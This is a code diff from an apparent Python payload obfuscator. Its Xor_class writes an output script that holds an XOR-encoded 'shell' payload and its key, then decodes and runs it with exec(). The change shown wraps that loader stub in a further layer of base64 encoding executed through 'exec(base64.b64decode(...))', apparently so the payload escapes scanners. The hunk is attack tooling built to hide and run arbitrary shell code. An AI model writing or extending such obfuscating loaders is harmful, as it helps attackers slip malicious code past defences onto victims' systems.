@@ -38,10 +38,10 @@ class Xor_class:
 
     def Fainal_Stage(self) : 
         with open(self.args.output,'w') as XP_load:
-             XP_load = XP_load.write('shell = '+str(self.Xor_Payload)+'\n'+'Key = '+str(self.Value_Key)+'\n'+\
+             XP_load1 = 'shell = '+str(self.Xor_Payload)+'\n'+'Key = '+str(self.Value_Key)+'\n'+\
              "de_code = bytes([ Z ^ C for Z , C in zip(shell , Key)])"+'\n'+'import base64\n'+\
-             'de_set = base64.b64decode(de_code).decode("utf-8")'+'\n'+'exec(de_set)')
-
+             'de_set = base64.b64decode(de_code).decode("utf-8")'+'\n'+'exec(de_set)'
+             XP_load.write("import base64\nexec(base64.b64decode("+str(base64.b64encode((XP_load1.encode())))+'))')
     def argparse_command(self):
 
         parser = argparse.ArgumentParser(description="Usage: [OPtion] [arguments] [ -w ] [arguments]")       
